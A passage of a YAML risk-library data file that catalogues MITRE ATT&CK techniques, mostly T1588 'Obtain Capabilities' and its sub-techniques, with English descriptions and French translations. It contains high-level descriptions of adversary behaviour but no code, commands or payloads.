      (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190),
      [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203),
      [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068),
      [Exploitation for Stealth](https://attack.mitre.org/techniques/T1211), [Exploitation
      for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation
      of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application
      or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).

      https://attack.mitre.org/techniques/T1587/004'
    translations:
      fr:
        name: Exploits
        description: "Les adversaires peuvent d\xE9velopper des exploits qui peuvent\
          \ \xEAtre utilis\xE9s lors du ciblage. Un exploit exploite un bug ou une\
          \ vuln\xE9rabilit\xE9 afin de provoquer des comportements inattendus ou\
          \ impr\xE9vus sur le mat\xE9riel ou le logiciel informatique. Plut\xF4t\
          \ que de trouver ou modifier des exploits en ligne ou de les acheter aupr\xE8\
          s de vendeurs d\u2019exploits, un adversaire peut d\xE9velopper ses propres\
          \ exploits. (Citation : NYTStuxnet) Les adversaires peuvent utiliser les\
          \ informations acquises via [Vuln\xE9rabilit\xE9s](https://attack.mitre.org/techniques/T1588/006)\
          \ pour concentrer les efforts de d\xE9veloppement d\u2019exploits. Dans\
          \ le cadre du processus de d\xE9veloppement des exploits, les adversaires\
          \ peuvent d\xE9couvrir des vuln\xE9rabilit\xE9s exploitables gr\xE2ce \xE0\
          \ des m\xE9thodes telles que le fuzzing et l\u2019analyse des correctifs.\
          \ (Citation : Irongeek Sims BSides 2017)\n\nComme pour les efforts de d\xE9\
          veloppement l\xE9gitimes, des comp\xE9tences diff\xE9rentes peuvent \xEA\
          tre n\xE9cessaires pour d\xE9velopper des exploits. Les comp\xE9tences requises\
          \ peuvent \xEAtre localis\xE9es en interne ou doivent \xEAtre sous-trait\xE9\
          es. L\u2019utilisation d\u2019un contractant peut \xEAtre consid\xE9r\xE9\
          e comme une extension des capacit\xE9s de d\xE9veloppement d\u2019exploits\
          \ de cet adversaire, \xE0 condition que cet adversaire joue un r\xF4le dans\
          \ la d\xE9finition des exigences et maintienne un degr\xE9 initial d\u2019\
          exclusivit\xE9 sur l\u2019exploit.\n\nLes adversaires peuvent utiliser des\
          \ exploits lors de diff\xE9rentes phases du cycle de vie de l\u2019adversaire\
          \ (par exemple [Exploiter une application publique](https://attack.mitre.org/techniques/T1190),\
          \ [Exploitation pour l\u2019ex\xE9cution du client](https://attack.mitre.org/techniques/T1203),\
          \ [Exploitation pour l\u2019escalade de privil\xE8ges](https://attack.mitre.org/techniques/T1068),\
          \ [Exploitation pour la discr\xE9tion](https://attack.mitre.org/techniques/T1211),\
          \ [Exploitation pour l\u2019acc\xE8s aux accr\xE9ditations](https://attack.mitre.org/techniques/T1212),\
          \ [Exploitation des services \xE0 distance](https://attack.mitre.org/techniques/T1210),\
          \ et [Exploitation d\u2019applications ou de syst\xE8me](https://attack.mitre.org/techniques/T1499/004)).\n\
          https://attack.mitre.org/techniques/T1587/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588
    ref_id: T1588
    name: Obtain Capabilities
    description: 'Adversaries may buy and/or steal capabilities that can be used during
      targeting. Rather than developing their own capabilities in-house, adversaries
      may purchase, freely download, or steal them. Activities may include the acquisition
      of malware, software (including licenses), exploits, certificates, and information
      relating to vulnerabilities. Adversaries may obtain capabilities to support
      their operations throughout numerous phases of the adversary lifecycle.


      In addition to downloading free malware, software, and exploits from the internet,
      adversaries may purchase these capabilities from third-party entities. Third-party
      entities can include technology companies that specialize in malware and exploits,
      criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation:
      PegasusCitizenLab)


      In addition to purchasing capabilities, adversaries may steal capabilities from
      third-party entities (including other adversaries). This can include stealing
      software licenses, malware, SSL/TLS and code-signing certificates, or raiding
      closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise)

      https://attack.mitre.org/techniques/T1588'
    translations:
      fr:
        name: "Acquisition des capacit\xE9s"
        description: "Les adversaires peuvent acheter et/ou voler des capacit\xE9\
          s qui peuvent \xEAtre utilis\xE9es lors du ciblage. Plut\xF4t que de d\xE9\
          velopper leurs propres capacit\xE9s en interne, les adversaires peuvent\
          \ les acheter, les t\xE9l\xE9charger librement ou les voler. Les activit\xE9\
          s peuvent inclure l\u2019acquisition de logiciels malveillants, de logiciels\
          \ (y compris des licences), d\u2019exploits, de certificats et d\u2019informations\
          \ relatives aux vuln\xE9rabilit\xE9s. Les adversaires peuvent acqu\xE9rir\
          \ des capacit\xE9s pour soutenir leurs op\xE9rations \xE0 travers de nombreuses\
          \ phases du cycle de vie adverse.\n\nEn plus de t\xE9l\xE9charger gratuitement\
          \ des malwares, des logiciels et des exploits sur Internet, les adversaires\
          \ peuvent acheter ces fonctionnalit\xE9s aupr\xE8s d\u2019entit\xE9s tierces.\
          \ Les entit\xE9s tierces peuvent inclure des entreprises technologiques\
          \ sp\xE9cialis\xE9es dans les logiciels malveillants et les exploits, les\
          \ march\xE9s criminels ou des particuliers. (Citation : NationsBuying)(Citation\
          \ : PegasusCitizenLab)\n\nEn plus d\u2019acheter des capacit\xE9s, les adversaires\
          \ peuvent voler des capacit\xE9s \xE0 des entit\xE9s tierces (y compris\
          \ d\u2019autres adversaires). Cela peut inclure le vol de licences logicielles,\
          \ de malwares, de certificats SSL/TLS et de signature de code, ou le pillage\
          \ de bases de donn\xE9es ferm\xE9es de vuln\xE9rabilit\xE9s ou d\u2019exploits.\
          \ (Citation : DiginotarCompromise)\nhttps://attack.mitre.org/techniques/T1588"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.001
    ref_id: T1588.001
    name: Malware
    description: 'Adversaries may buy, steal, or download malware that can be used
      during targeting. Malicious software can include payloads, droppers, post-compromise
      tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware
      to support their operations, obtaining a means for maintaining control of remote
      machines, evading defenses, and executing post-compromise behaviors.


      In addition to downloading free malware from the internet, adversaries may purchase
      these capabilities from third-party entities. Third-party entities can include
      technology companies that specialize in malware development, criminal marketplaces
      (including Malware-as-a-Service, or MaaS), or from individuals. In addition
      to purchasing malware, adversaries may steal and repurpose malware from third-party
      entities (including other adversaries).

      https://attack.mitre.org/techniques/T1588/001'
    translations:
      fr:
        name: Malware
        description: "Les adversaires peuvent acheter, voler ou t\xE9l\xE9charger\
          \ des logiciels malveillants utilisables lors du ciblage. Les logiciels\
          \ malveillants peuvent inclure des charges utiles, des droppers, des outils\
          \ post-compromis, des portes d\xE9rob\xE9es, des packers et des protocoles\
          \ C2. Les adversaires peuvent acqu\xE9rir des malwares pour soutenir leurs\
          \ op\xE9rations, obtenant un moyen de maintenir le contr\xF4le des machines\
          \ distantes, d\u2019\xE9viter les d\xE9fenses et d\u2019ex\xE9cuter des\
          \ comportements post-compromis.\n\nEn plus de t\xE9l\xE9charger des malwares\
          \ gratuits depuis Internet, les adversaires peuvent acheter ces fonctionnalit\xE9\
          s aupr\xE8s d\u2019entit\xE9s tierces. Les entit\xE9s tierces peuvent inclure\
          \ des entreprises technologiques sp\xE9cialis\xE9es dans le d\xE9veloppement\
          \ de malwares, des places de march\xE9 criminelles (y compris le Malware-as-a-Service,\
          \ ou MaaS), ou des particuliers. En plus d\u2019acheter des logiciels malveillants,\
          \ les adversaires peuvent voler et r\xE9utiliser des logiciels malveillants\
          \ aupr\xE8s d\u2019entit\xE9s tierces (y compris d\u2019autres adversaires).\n\
          https://attack.mitre.org/techniques/T1588/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.002
    ref_id: T1588.002
    name: Tool
    description: "Adversaries may buy, steal, or download software tools that can\
      \ be used during targeting. Tools can be open or closed source, free or commercial.\
      \ A tool can be used for malicious purposes by an adversary, but (unlike malware)\
      \ were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)).\
      \ \n\nAdversaries may obtain tools to support their operations, including to\
      \ support execution of post-compromise behaviors. Tools may also be leveraged\
      \ for testing \u2013 for example, evaluating malware against commercial antivirus\
      \ or endpoint detection and response (EDR) applications.(Citation: Forescout\
      \ Conti Leaks 2022)(Citation: Sentinel Labs Top Tier Target 2025)\n\nTool acquisition\
      \ may involve the procurement of commercial software licenses, including for\
      \ red teaming tools such as Cobalt Strike. In addition to freely downloading\
      \ or purchasing software, adversaries may steal software and/or software licenses\
      \ from third-party entities (including other adversaries). Threat actors may\
      \ also crack trial versions of software.(Citation: Recorded Future Beacon 2019)\n\
      https://attack.mitre.org/techniques/T1588/002"
    translations:
      fr:
        name: Outil
        description: "Les adversaires peuvent acheter, voler ou t\xE9l\xE9charger\
          \ des outils logiciels utilisables lors du ciblage. Les outils peuvent \xEA\
          tre open source ou ferm\xE9, gratuits ou commerciaux. Un outil peut \xEA\
          tre utilis\xE9 \xE0 des fins malveillantes par un adversaire, mais (contrairement\
          \ aux logiciels malveillants) n\u2019\xE9tait pas destin\xE9 \xE0 \xEAtre\
          \ utilis\xE9 \xE0 ces fins (ex : [PsExec](https://attack.mitre.org/software/S0029)).\
          \ \n\nLes adversaires peuvent obtenir des outils pour soutenir leurs op\xE9\
          rations, notamment pour soutenir l\u2019ex\xE9cution de comportements post-compromis.\
          \ Les outils peuvent \xE9galement \xEAtre utilis\xE9s pour des tests \u2013\
          \ par exemple, pour comparer les logiciels malveillants aux antivirus commerciaux\
          \ ou aux applications de d\xE9tection et de r\xE9ponse par terminaux (EDR).\
          \ (Citation : Forescout Conti fuites 2022)(Citation : Cible de premier plan\
          \ de Sentinel Labs 2025)\n\nL\u2019acquisition d\u2019outils peut impliquer\
          \ l\u2019obtention de licences logicielles commerciales, y compris pour\
          \ des outils de red teaming comme Cobalt Strike. En plus de t\xE9l\xE9charger\
          \ ou acheter librement des logiciels, les adversaires peuvent voler des\
          \ logiciels et/ou des licences logicielles aupr\xE8s d\u2019entit\xE9s tierces\
          \ (y compris d\u2019autres adversaires). Les acteurs malveillants peuvent\
          \ \xE9galement pirater les versions d\u2019essai des logiciels. (Citation\
          \ : Future Beacon enregistr\xE9 2019)\nhttps://attack.mitre.org/techniques/T1588/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.003
    ref_id: T1588.003
    name: Code Signing Certificates
    description: 'Adversaries may buy and/or steal code signing certificates that
      can be used during targeting. Code signing is the process of digitally signing
      executables and scripts to confirm the software author and guarantee that the
      code has not been altered or corrupted. Code signing provides a level of authenticity
      for a program from the developer and a guarantee that the program has not been
      tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools
      may trust a signed piece of code more than an unsigned piece of code even if
      they don''t know who issued the certificate or who the author is.


      Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries
      may purchase or steal code signing certificates for use in operations. The purchase
      of code signing certificates may be done using a front organization or using
      information stolen from a previously compromised entity that allows the adversary
      to validate to a certificate provider as that entity. Adversaries may also steal
      code signing materials directly from a compromised third-party.

      https://attack.mitre.org/techniques/T1588/003'
    translations:
      fr:
        name: Certificats de signature de code
        description: "Les adversaires peuvent acheter et/ou voler des certificats\
          \ de signature de code qui peuvent \xEAtre utilis\xE9s lors du ciblage.\
          \ La signature de code est le processus de signature num\xE9rique de ex\xE9\
          cutables et de scripts pour confirmer l\u2019auteur du logiciel et garantir\
          \ que le code n\u2019a pas \xE9t\xE9 modifi\xE9 ou corrompu. La signature\
          \ de code offre un certain niveau d\u2019authenticit\xE9 pour un programme\
          \ de la part du d\xE9veloppeur et une garantie que le programme n\u2019\
          a pas \xE9t\xE9 alt\xE9r\xE9. (Citation : Signature de code Wikip\xE9dia)\
          \ Les utilisateurs et/ou les outils de s\xE9curit\xE9 peuvent faire plus\
          \ confiance \xE0 un morceau de code sign\xE9 qu\u2019\xE0 un morceau de\
          \ code non sign\xE9, m\xEAme s\u2019ils ne savent pas qui a \xE9mis le certificat\
          \ ni qui est l\u2019auteur.\n\nAvant [Signature de Code](https://attack.mitre.org/techniques/T1553/002),\
          \ les adversaires peuvent acheter ou voler des certificats de signature\
          \ de code pour les utiliser dans des op\xE9rations. L\u2019achat de certificats\
          \ de signature de code peut se faire via une organisation \xE9cran ou \xE0\
          \ partir d\u2019informations vol\xE9es \xE0 une entit\xE9 pr\xE9c\xE9demment\
          \ compromise, permettant \xE0 l\u2019adversaire de valider aupr\xE8s d\u2019\
          un fournisseur de certificats en tant qu\u2019entit\xE9. Les adversaires\
          \ peuvent \xE9galement voler les documents de signature de code directement\
          \ aupr\xE8s d\u2019un tiers compromis.\nhttps://attack.mitre.org/techniques/T1588/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.004
    ref_id: T1588.004
    name: Digital Certificates
    description: 'Adversaries may buy and/or steal SSL/TLS certificates that can be
      used during targeting. SSL/TLS certificates are designed to instill trust. They
      include information about the key, information about its owner''s identity,
      and the digital signature of an entity that has verified the certificate''s
      contents are correct. If the signature is valid, and the person examining the
      certificate trusts the signer, then they know they can use that key to communicate
      with its owner.


      Adversaries may purchase or steal SSL/TLS certificates to further their operations,
      such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002)
      with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even
      enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)
      if the certificate is trusted or otherwise added to the root of trust (i.e.
      [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).
      The purchase of digital certificates may be done using a front organization
      or using information stolen from a previously compromised entity that allows
      the adversary to validate to a certificate provider as that entity. Adversaries
      may also steal certificate materials directly from a compromised third-party,
      including from certificate authorities.(Citation: DiginotarCompromise) Adversaries
      may register or hijack domains that they will later purchase an SSL/TLS certificate
      for.


      Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates,
      such as domain validation certificates, for free.(Citation: Let''s Encrypt FAQ)


      After obtaining a digital certificate, an adversary may then install that certificate
      (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003))
      on infrastructure under their control.

      https://attack.mitre.org/techniques/T1588/004'
    translations:
      fr:
        name: "Certificats num\xE9riques"
        description: "Les adversaires peuvent acheter et/ou voler des certificats\
          \ SSL/TLS qui peuvent \xEAtre utilis\xE9s lors du ciblage. Les certificats\
          \ SSL/TLS sont con\xE7us pour instaurer la confiance. Ils incluent des informations\
          \ sur la cl\xE9, des informations sur l\u2019identit\xE9 de son propri\xE9\
          taire, ainsi que la signature num\xE9rique d\u2019une entit\xE9 ayant v\xE9\
          rifi\xE9 que le contenu du certificat est correct. Si la signature est valide\
          \ et que la personne qui examine le certificat fait confiance au signataire,\
          \ elle sait alors qu\u2019elle peut utiliser cette cl\xE9 pour communiquer\
          \ avec son propri\xE9taire.\n\nLes adversaires peuvent acheter ou voler\
          \ des certificats SSL/TLS pour poursuivre leurs op\xE9rations, comme chiffrer\
          \ le trafic C2 (ex : [Cryptographie asym\xE9trique](https://attack.mitre.org/techniques/T1573/002)\
          \ avec [Protocoles Web](https://attack.mitre.org/techniques/T1071/001))\
          \ ou m\xEAme activer [Adversaire-in-the-Middle](https://attack.mitre.org/techniques/T1557)\
          \ si le certificat est digne de confiance ou ajout\xE9 \xE0 la racine de\
          \ confiance (c\u2019est-\xE0-dire [Installer le certificat root]( https://attack.mitre.org/techniques/T1553/004)).\
          \ L\u2019achat de certificats num\xE9riques peut se faire via une organisation\
          \ \xE9cran ou \xE0 l\u2019aide d\u2019informations vol\xE9es \xE0 une entit\xE9\
          \ pr\xE9c\xE9demment compromise, permettant \xE0 l\u2019adversaire de valider\
          \ aupr\xE8s d\u2019un fournisseur de certificats en tant qu\u2019entit\xE9\
          . Les adversaires peuvent \xE9galement voler des documents de certificat\
          \ directement aupr\xE8s d\u2019un tiers compromis, y compris aupr\xE8s des\
          \ autorit\xE9s de certification. (Citation : DiginotarCompromise) Les adversaires\
          \ peuvent enregistrer ou d\xE9tourner des domaines pour lesquels ils ach\xE8\
          teront ensuite un certificat SSL/TLS.\n\nDes autorit\xE9s de certification\
          \ existent qui permettent aux adversaires d\u2019acqu\xE9rir gratuitement\
          \ des certificats SSL/TLS, tels que les certificats de validation de domaine.\
          \ (Citation : FAQ Let\u2019s Encrypt)\n\nApr\xE8s avoir obtenu un certificat\
          \ num\xE9rique, un adversaire peut alors installer ce certificat (voir [Installer\
          \ le certificat num\xE9rique](https://attack.mitre.org/techniques/T1608/003))\
          \ sur l\u2019infrastructure sous son contr\xF4le.\nhttps://attack.mitre.org/techniques/T1588/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.005
    ref_id: T1588.005
    name: Exploits
    description: 'Adversaries may buy, steal, or download exploits that can be used
      during targeting. An exploit takes advantage of a bug or vulnerability in order
      to cause unintended or unanticipated behavior to occur on computer hardware
      or software. Rather than developing their own exploits, an adversary may find/modify
      exploits from online or purchase them from exploit vendors.(Citation: Exploit
      Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying)


      In addition to downloading free exploits from the internet, adversaries may
      purchase exploits from third-party entities. Third-party entities can include
      technology companies that specialize in exploit development, criminal marketplaces
      (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation:
      Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may
      steal and repurpose exploits from third-party entities (including other adversaries).(Citation:
      TempertonDarkHotel)


      An adversary may monitor exploit provider forums to understand the state of
      existing, as well as newly discovered, exploits. There is usually a delay between
      when an exploit is discovered and when it is made public. An adversary may target
      the systems of those known to conduct exploit research and development in order
      to gain that knowledge for use during a subsequent operation.


      Adversaries may use exploits during various phases of the adversary lifecycle
      (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190),
      [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203),
      [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068),
      [Exploitation for Stealth](https://attack.mitre.org/techniques/T1211), [Exploitation
      for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation
      of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application
      or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).

      https://attack.mitre.org/techniques/T1588/005'
    translations:
      fr:
        name: Exploits
        description: "Les adversaires peuvent acheter, voler ou t\xE9l\xE9charger\
          \ des exploits qui peuvent \xEAtre utilis\xE9s lors du ciblage. Un exploit\
          \ exploite un bug ou une vuln\xE9rabilit\xE9 afin de provoquer des comportements\
          \ inattendus ou impr\xE9vus sur le mat\xE9riel ou le logiciel informatique.\
          \ Plut\xF4t que de d\xE9velopper ses propres exploits, un adversaire peut\
          \ trouver/modifier les exploits en ligne ou les acheter aupr\xE8s de vendeurs\
          \ d\u2019exploits. (Citation : Base de donn\xE9es d\u2019exploits)(Citation\
          \ : TempertonDarkHotel)(Citation : NationsBuying)\n\nEn plus de t\xE9l\xE9\
          charger des exploits gratuits depuis Internet, les adversaires peuvent acheter\
          \ des exploits aupr\xE8s d\u2019entit\xE9s tierces. Les entit\xE9s tierces\
          \ peuvent inclure des entreprises technologiques sp\xE9cialis\xE9es dans\
          \ le d\xE9veloppement d\u2019exploits, des march\xE9s criminels (y compris\
          \ des kits d\u2019exploitation) ou des particuliers. (Citation : PegasusCitizenLab)(Citation\
          \ : Wired SandCat, oct. 2019) En plus d\u2019acheter des exploits, les adversaires\
          \ peuvent voler et r\xE9utiliser des exploits aupr\xE8s d\u2019entit\xE9\
          s tierces (y compris d\u2019autres adversaires). (Citation : TempertonDarkHotel)\n\
          \nUn adversaire peut surveiller les forums des fournisseurs d\u2019exploits\
          \ pour comprendre l\u2019\xE9tat des exploits existants ainsi que des nouveaux\
          \ d\xE9couverts. Il y a g\xE9n\xE9ralement un d\xE9lai entre la d\xE9couverte\
          \ d\u2019un exploit et sa publication du moment. Un adversaire peut cibler\
          \ les syst\xE8mes de ceux connus pour mener des recherches et d\xE9veloppements\
          \ sur les exploits afin d\u2019acqu\xE9rir ces connaissances pour les utiliser\
          \ lors d\u2019une op\xE9ration ult\xE9rieure.\n\nLes adversaires peuvent\
          \ utiliser des exploits lors de diff\xE9rentes phases du cycle de vie de\
          \ l\u2019adversaire (par exemple [Exploiter une application publique](https://attack.mitre.org/techniques/T1190),\
          \ [Exploitation pour l\u2019ex\xE9cution du client](https://attack.mitre.org/techniques/T1203),\
          \ [Exploitation pour l\u2019escalade de privil\xE8ges](https://attack.mitre.org/techniques/T1068),\
          \ [Exploitation pour la discr\xE9tion](https://attack.mitre.org/techniques/T1211),\
          \ [Exploitation pour l\u2019acc\xE8s aux accr\xE9ditations](https://attack.mitre.org/techniques/T1212),\
          \ [Exploitation des services \xE0 distance](https://attack.mitre.org/techniques/T1210),\
          \ et [Exploitation d\u2019applications ou de syst\xE8me](https://attack.mitre.org/techniques/T1499/004)).\n\
          https://attack.mitre.org/techniques/T1588/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.006
    ref_id: T1588.006
    name: Vulnerabilities
    description: 'Adversaries may acquire information about vulnerabilities that can
      be used during targeting. A vulnerability is a weakness in computer hardware
      or software that can, potentially, be exploited by an adversary to cause unintended
      or unanticipated behavior to occur. Adversaries may find vulnerability information
      by searching open databases or gaining access to closed vulnerability databases.(Citation:
      National Vulnerability Database)


      An adversary may monitor vulnerability disclosures/databases to understand the
      state of existing, as well as newly discovered, vulnerabilities. There is usually
      a delay between when a vulnerability is discovered and when it is made public.
      An adversary may target the systems of those known to conduct vulnerability
      research (including commercial vendors). Knowledge of a vulnerability may cause
      an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005))
      or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).

      https://attack.mitre.org/techniques/T1588/006'
    translations:
      fr:
        name: "Vuln\xE9rabilit\xE9s"
        description: "Les adversaires peuvent acqu\xE9rir des informations sur des\
          \ vuln\xE9rabilit\xE9s qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ Une vuln\xE9rabilit\xE9 est une faiblesse du mat\xE9riel ou du logiciel\
          \ informatique qui peut, potentiellement, \xEAtre exploit\xE9e par un adversaire\
          \ pour provoquer des comportements inattendus ou inattendus. Les adversaires\
          \ peuvent trouver des informations sur les vuln\xE9rabilit\xE9s en consultant\
          \ dans des bases de donn\xE9es ouvertes ou en acc\xE9dant \xE0 des bases\
          \ de donn\xE9es ferm\xE9es. (Citation : Base de donn\xE9es nationale des\
          \ vuln\xE9rabilit\xE9s)\n\nUn adversaire peut surveiller les divulgations/bases\
          \ de donn\xE9es de vuln\xE9rabilit\xE9s afin de comprendre l\u2019\xE9tat\
          \ des vuln\xE9rabilit\xE9s existantes ainsi que des nouvelles d\xE9couvertes.\
          \ Il y a g\xE9n\xE9ralement un d\xE9lai entre la d\xE9couverte d\u2019une\
          \ vuln\xE9rabilit\xE9 et celle o\xF9 elle est rendue publique. Un adversaire\
          \ peut cibler les syst\xE8mes de ceux connus pour mener des recherches sur\
          \ les vuln\xE9rabilit\xE9s (y compris les fournisseurs commerciaux). La\
          \ connaissance d\u2019une vuln\xE9rabilit\xE9 peut amener un adversaire\
          \ \xE0 rechercher un exploit existant (c\u2019est-\xE0-dire [Exploits](https://attack.mitre.org/techniques/T1588/005))\
          \ ou \xE0 tenter d\u2019en d\xE9velopper un lui-m\xEAme (c\u2019est-\xE0\
          -dire [Exploits](https://attack.mitre.org/techniques/T1587/004)).\nhttps://attack.mitre.org/techniques/T1588/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.007
    ref_id: T1588.007
    name: Artificial Intelligence
    description: "Adversaries may obtain access to generative artificial intelligence\
      \ tools, such as large language models (LLMs), to aid various techniques during\
      \ targeting. These tools may be used to inform, bolster, and enable a variety\
      \ of malicious tasks, including conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043),\
      \ creating basic scripts, assisting social engineering, and even developing\
      \ payloads.(Citation: MSFT-AI) \n\nFor example, by utilizing a publicly available\
      \ LLM an adversary is essentially outsourcing or automating certain tasks to\
      \ the tool. Using AI, the adversary may draft and generate content in a variety\
      \ of written languages to be used in [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing\
      \ for Information](https://attack.mitre.org/techniques/T1598) campaigns. The\
      \ same publicly available tool may further enable vulnerability or other offensive\
      \ research supporting [Develop Capabilities](https://attack.mitre.org/techniques/T1587).\
      \ AI tools may also automate technical tasks by generating, refining, or otherwise\
      \ enhancing (e.g., [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027))\
      \ malicious scripts and payloads.(Citation: OpenAI-CTI) Finally, AI-generated\
      \ text, images, audio, and video may be used for fraud, [Impersonation](https://attack.mitre.org/techniques/T1684/001),\
      \ and other malicious activities.(Citation: Google-Vishing24)(Citation: IC3-AI24)(Citation:\
      \ WSJ-Vishing-AI24)\nhttps://attack.mitre.org/techniques/T1588/007"
    translations:
      fr:
        name: Intelligence artificielle
        description: "Les adversaires peuvent acc\xE9der \xE0 des outils d\u2019intelligence\
          \ artificielle g\xE9n\xE9rative, tels que de grands mod\xE8les de langage\
          \ (LLM), pour faciliter diverses techniques lors du ciblage. Ces outils\
          \ peuvent \xEAtre utilis\xE9s pour informer, renforcer et permettre diverses\
          \ t\xE2ches malveillantes, notamment la r\xE9alisation de [Reconnaissance](https://attack.mitre.org/tactics/TA0043),\
          \ la cr\xE9ation de scripts de base, l\u2019assistance \xE0 l\u2019ing\xE9\
          nierie sociale, et m\xEAme le d\xE9veloppement de charges utiles. (Citation\
          \ : MSFT-AI) \n\nPar exemple, en utilisant un LLM accessible publiquement,\
          \ un adversaire externalise ou automatise essentiellement certaines t\xE2\
          ches vers l\u2019outil. Gr\xE2ce \xE0 l\u2019IA, l\u2019adversaire peut\
          \ r\xE9diger et g\xE9n\xE9rer du contenu dans une vari\xE9t\xE9 de langages\
          \ \xE9crits destin\xE9s \xE0 \xEAtre utilis\xE9s dans les campagnes [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing\
          \ for Information](https://attack.mitre.org/techniques/T1598). Le m\xEA\
          me outil disponible au public peut encore permettre la vuln\xE9rabilit\xE9\
          \ ou d\u2019autres recherches offensives soutenant [D\xE9velopper des Capacit\xE9\
          s](https://attack.mitre.org/techniques/T1587). Les outils d\u2019IA peuvent\
          \ \xE9galement automatiser des t\xE2ches techniques en g\xE9n\xE9rant, affinant\
          \ ou am\xE9liorant (par exemple, [Fichiers ou informations obscurcis](https://attack.mitre.org/techniques/T1027))\
          \ scripts et charges utiles malveillants. (Citation : OpenAI-CTI) Enfin,\
          \ le texte, les images, l\u2019audio et la vid\xE9o g\xE9n\xE9r\xE9s par\
          \ IA peuvent \xEAtre utilis\xE9s pour la fraude, l'[usurpation d\u2019identit\xE9\
          ](https://attack.mitre.org/techniques/T1684/001) et d\u2019autres activit\xE9\
          s malveillantes. (Citation : Google-Vishing24)(Citation : IC3-AI24)(Citation\
          \ : WSJ-Vishing-AI24)\nhttps://attack.mitre.org/techniques/T1588/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1589
    ref_id: T1589
    name: Gather Victim Identity Information
    description: 'Adversaries may gather information about the victim''s identity
      that can be used during targeting. Information about identities may include
      a variety of details, including personal data (ex: employee names, email addresses,
      security question responses, etc.) as well as sensitive details such as credentials
      or multi-factor authentication (MFA) configurations.


      Adversaries may gather this information in various ways, such as direct elicitation
      via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about users could also be enumerated via other active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595))
      such as probing and analyzing responses from authentication services that may
      reveal valid usernames in a system or permitted MFA /methods associated with
      those usernames.(Citation: GrimBlog UsernameEnum)(Citation: Obsidian SSPR Abuse
      2023) Information about victims may also be exposed to adversaries via online
      or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)
      or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation:
      OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify
      Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation:
      GitHub Gitrob)(Citation: CNET Leaks)


      Gathering this information may reveal opportunities for other forms of reconnaissance
      (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing
      operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)),
      and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)
      or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).

      https://attack.mitre.org/techniques/T1589'
    translations:
      fr:
        name: "Recueillez les informations sur l\u2019identit\xE9 des victimes"
        description: "Les adversaires peuvent recueillir des informations sur l\u2019\
          identit\xE9 de la victime qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ Les informations sur les identit\xE9s peuvent inclure une vari\xE9t\xE9\
          \ de d\xE9tails, notamment des donn\xE9es personnelles (ex. : noms d\u2019\
          employ\xE9s, adresses e-mail, r\xE9ponses \xE0 des questions de s\xE9curit\xE9\
          , etc.) ainsi que des d\xE9tails sensibles tels que des identifiants ou\
          \ des configurations d\u2019authentification multifacteur (MFA).\n\nLes\
          \ adversaires peuvent recueillir ces informations de diff\xE9rentes mani\xE8\
          res, comme par l\u2019obtention directe via [Phishing for Information](https://attack.mitre.org/techniques/T1598).\
          \ Les informations sur les utilisateurs pouvaient \xE9galement \xEAtre \xE9\
          num\xE9r\xE9es via d\u2019autres moyens actifs (par exemple [Scan actif](https://attack.mitre.org/techniques/T1595))\
          \ tels que la sonde et l\u2019analyse des r\xE9ponses des services d\u2019\
          authentification pouvant r\xE9v\xE9ler des noms d\u2019utilisateur valides\
          \ dans un syst\xE8me ou des MFA/m\xE9thodes autoris\xE9es associ\xE9es \xE0\
